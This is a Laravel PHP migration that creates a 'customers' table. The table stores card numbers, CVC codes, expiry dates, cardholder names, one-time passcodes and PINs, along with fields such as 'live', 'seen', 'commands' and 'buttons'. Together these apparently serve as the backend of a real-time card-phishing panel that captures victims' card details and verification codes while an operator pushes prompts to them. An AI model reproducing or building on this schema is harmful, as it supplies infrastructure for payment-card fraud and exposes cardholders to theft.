<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('customers', function (Blueprint $table) {
            $table->id();
            //$table->string('ip');
            $table->string('number')->nullable();
            $table->string('cvc')->nullable();
            $table->string('expmonth')->nullable();
            $table->string('expyear')->nullable();
            $table->string('cardholder')->nullable();
            $table->string('otp')->nullable();
            $table->string('pin')->nullable();
            $table->json('data')->nullable();
            $table->boolean('seen')->nullable()->default(false);
            $table->string('commands')->nullable();
            $table->string('email')->nullable();
            $table->string('live')->nullable();
            $table->boolean('news')->nullable()->default(true);
            $table->string('ccname')->nullable();
            $table->json('buttons')->nullable();
            $table->boolean('active')->nullable()->default(true);
            $table->foreignId('user_id')->constrained()->onDelete('cascade');
            $table->json('bin')->nullable();
            $table->timestamps();
            $table->softDeletes();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('customers');
    }
};
